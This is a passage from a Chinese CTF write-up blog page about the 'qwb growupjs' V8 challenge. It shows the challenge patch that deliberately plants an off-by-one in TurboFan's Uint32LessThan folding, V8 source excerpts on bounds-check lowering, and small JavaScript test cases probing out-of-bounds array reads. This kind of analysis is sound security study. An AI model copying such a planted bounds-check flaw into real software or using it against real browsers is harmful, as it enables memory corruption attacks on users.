@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="qwb growupjs &amp;amp; wctf independence_day writeupqwb growupjs漏洞分析12345678910111213diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.ccindex a6a8e87cf4..164ab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qwb growupjs &amp; wctf independence_day writeup">
+<meta property="og:url" content="http://eternalsakura13.com/2019/07/16/qwb growupjs & wctf independence_day writeup/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="qwb growupjs &amp;amp; wctf independence_day writeupqwb growupjs漏洞分析12345678910111213diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.ccindex a6a8e87cf4..164ab">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104415.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-112448.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-113657.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-115435.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-121438.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072849.jpg">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072916.jpg">
+<meta property="og:updated_time" content="2019-07-17T08:08:25.590Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qwb growupjs &amp; wctf independence_day writeup">
+<meta name="twitter:description" content="qwb growupjs &amp;amp; wctf independence_day writeupqwb growupjs漏洞分析12345678910111213diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.ccindex a6a8e87cf4..164ab">
+<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2019/07/16/qwb growupjs & wctf independence_day writeup/"/>
+
+
+
+
+
+  <title>qwb growupjs & wctf independence_day writeup | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-buglist">
+          <a href="/buglist/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            BugList
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2019/07/16/qwb growupjs & wctf independence_day writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/sakura_heart.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">qwb growupjs & wctf independence_day writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-16T18:23:12+08:00">
+                2019-07-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/浏览器/" itemprop="url" rel="index">
+                    <span itemprop="name">浏览器</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/16/qwb growupjs & wctf independence_day writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/07/16/qwb growupjs & wctf independence_day writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="qwb-growupjs-amp-wctf-independence-day-writeup"><a href="#qwb-growupjs-amp-wctf-independence-day-writeup" class="headerlink" title="qwb growupjs &amp; wctf independence_day writeup"></a>qwb growupjs &amp; wctf independence_day writeup</h1><h2 id="qwb-growupjs"><a href="#qwb-growupjs" class="headerlink" title="qwb growupjs"></a>qwb growupjs</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line">--- a/src/compiler/machine-operator-reducer.cc</span><br><span class="line">+++ b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K</span><br><span class="line">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure>
+<p>patch如上，实际上是在MachineOperatorReducer的这个case中<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kUint32LessThan: &#123;</span><br><span class="line">      <span class="function">Uint32BinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (m.left().Is(kMaxUInt32)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// M &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.right().Is(<span class="number">0</span>)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);          <span class="comment">// x &lt; 0 =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.IsFoldable()) &#123;                                    <span class="comment">// K &lt; K =&gt; K</span></span><br><span class="line">        <span class="keyword">return</span> ReplaceBool(m.left().Value() &lt; m.right().Value()+<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (m.LeftEqualsRight()) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// x &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br><span class="line">        Int32BinopMatcher mleft(m.left().node());</span><br><span class="line">        <span class="keyword">if</span> (mleft.right().HasValue()) &#123;</span><br><span class="line">          <span class="comment">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span></span><br><span class="line">          <span class="comment">// when C &lt; (M &gt;&gt; K)</span></span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> c = m.right().Value();</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> k = mleft.right().Value() &amp; <span class="number">0x1F</span>;</span><br><span class="line">          <span class="keyword">if</span> (c &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(kMaxInt &gt;&gt; k)) &#123;</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">0</span>, mleft.left().node());</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">1</span>, Uint32Constant(c &lt;&lt; k));</span><br><span class="line">            <span class="keyword">return</span> Changed(node);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TODO(turbofan): else the comparison is always true.</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>首先这个patch很简单，就是本来如果是1&lt;1这样的kUint32LessThan比较，应该替换成false节点，而这里变成1&lt;2（<code>m.right().Value()+1)</code>），于是就替换成了true节点。<br>这个bug非常明显，但是如何利用呢？实际上对array边界的检查可以lower到Uint32LessThan节点，所以这实际上可以转化成一个array的off-by-one漏洞。<br>然后后续利用和<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a>中使用的方法一致。</p>
+<h3 id="IR分析"><a href="#IR分析" class="headerlink" title="IR分析"></a>IR分析</h3><p>我做了几组case，先看一个比较简单的case</p>
+<h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    let arr = [1.1, 2.2, 3.3, 4.4];</span><br><span class="line">    let idx = 3;</span><br><span class="line">    return arr[idx];</span><br><span class="line">&#125;</span><br><span class="line">for (i = 0; i &lt; 10000; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>typer phase<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png" alt=""><br>在取arr[idx]之前会进行CheckBounds，然后在Simplified lower之后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          CheckBoundsParameters::Mode mode =</span><br><span class="line">              CheckBoundsParameters::kDeoptOnOutOfBounds;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            mode = CheckBoundsParameters::kAbortOnOutOfBounds;</span><br><span class="line">          &#125;</span><br><span class="line">          NodeProperties::ChangeOp(</span><br><span class="line">              node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104415.png" alt=""><br>然后在Effect linearization中被Lower成Uint32LessThan。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Node* EffectControlLinearizer::LowerCheckedUint32Bounds(Node* node,</span><br><span class="line">                                                        Node* frame_state) &#123;</span><br><span class="line">  Node* index = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">  Node* limit = node-&gt;InputAt(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op());</span><br><span class="line"></span><br><span class="line">  Node* check = __ Uint32LessThan(index, limit);</span><br><span class="line">  <span class="keyword">switch</span> (params.mode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kDeoptOnOutOfBounds:</span><br><span class="line">      __ DeoptimizeIfNot(DeoptimizeReason::kOutOfBounds,</span><br><span class="line">                         params.check_parameters().feedback(), check,</span><br><span class="line">                         frame_state, IsSafetyCheck::kCriticalSafetyCheck);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kAbortOnOutOfBounds: &#123;</span><br><span class="line">      <span class="keyword">auto</span> if_abort = __ MakeDeferredLabel();</span><br><span class="line">      <span class="keyword">auto</span> done = __ MakeLabel();</span><br><span class="line"></span><br><span class="line">      __ Branch(check, &amp;done, &amp;if_abort);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;if_abort);</span><br><span class="line">      __ Unreachable();</span><br><span class="line">      __ Goto(&amp;done);</span><br><span class="line"></span><br><span class="line">      __ Bind(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-112448.png" alt=""></p>
+<h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><p>那么是不是把idx直接改成4，就可以越界读写一个element呢？<br>事实上没那么简单，它们生成的IR完全不一样。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>typer phase<br>我们得到的IR是这样的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-113657.png" alt=""><br>代码在<code>JSNativeContextSpecialization::BuildElementAccess</code>里<br>首先判断是否是<code>load_mode=LOAD_IGNORE_OUT_OF_BOUNDS</code><br>比较简单的一种情况就是array的index超出了array的length。<br>这样我们需要对index进行check，看是否超出了Smi::kMaxValue，引入了上面的CheckBounds节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we might need to grow the &#123;elements&#125; backing store.</span></span><br><span class="line"><span class="keyword">if</span> (keyed_mode.IsStore() &amp;&amp; IsGrowStoreMode(keyed_mode.store_mode())) &#123;</span><br><span class="line">  <span class="comment">// For growing stores we validate the &#123;index&#125; below.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyed_mode.IsLoad() &amp;&amp;</span><br><span class="line">           keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">           CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is a valid array index, we do the actual</span></span><br><span class="line">  <span class="comment">// bounds check below and just skip the store below if it's out of</span></span><br><span class="line">  <span class="comment">// bounds for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect = graph()-&gt;NewNode(</span><br><span class="line">      simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">      jsgraph()-&gt;Constant(Smi::kMaxValue), effect, control);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is in the valid range for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect =</span><br><span class="line">      graph()-&gt;NewNode(simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">                       length, effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后还需要对index进行实际的check，也就是比较index是否小于array length，引入了一个NumberLessThan节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we can return undefined for out-of-bounds loads.</span></span><br><span class="line">      <span class="keyword">if</span> (keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">          CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">        Node* check =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;NumberLessThan(), index, length);</span><br><span class="line">        Node* branch = graph()-&gt;NewNode(</span><br><span class="line">            common()-&gt;Branch(BranchHint::kTrue,</span><br><span class="line">                             IsSafetyCheck::kCriticalSafetyCheck),</span><br><span class="line">            check, control);</span><br><span class="line"></span><br><span class="line">        Node* if_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch);</span><br><span class="line">        Node* etrue = effect;</span><br><span class="line">        Node* vtrue;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// Perform the actual load</span></span><br><span class="line">          vtrue = etrue =</span><br><span class="line">              graph()-&gt;NewNode(simplified()-&gt;LoadElement(element_access),</span><br><span class="line">                               elements, index, etrue, if_true);</span><br></pre></td></tr></table></figure></p>
+<p>然后这个节点在LoadElimination进行TyperNarrowingReducer的时候。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">  <span class="keyword">case</span> IrOpcode::kNumberLessThan: &#123;</span><br><span class="line">    <span class="comment">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span></span><br><span class="line">    <span class="comment">// comparisons with the operation typer).</span></span><br><span class="line">    Type left_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type right_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (left_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">        right_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left_type.Max() &lt; right_type.Min()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_true();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left_type.Min() &gt;= right_type.Max()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_false();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
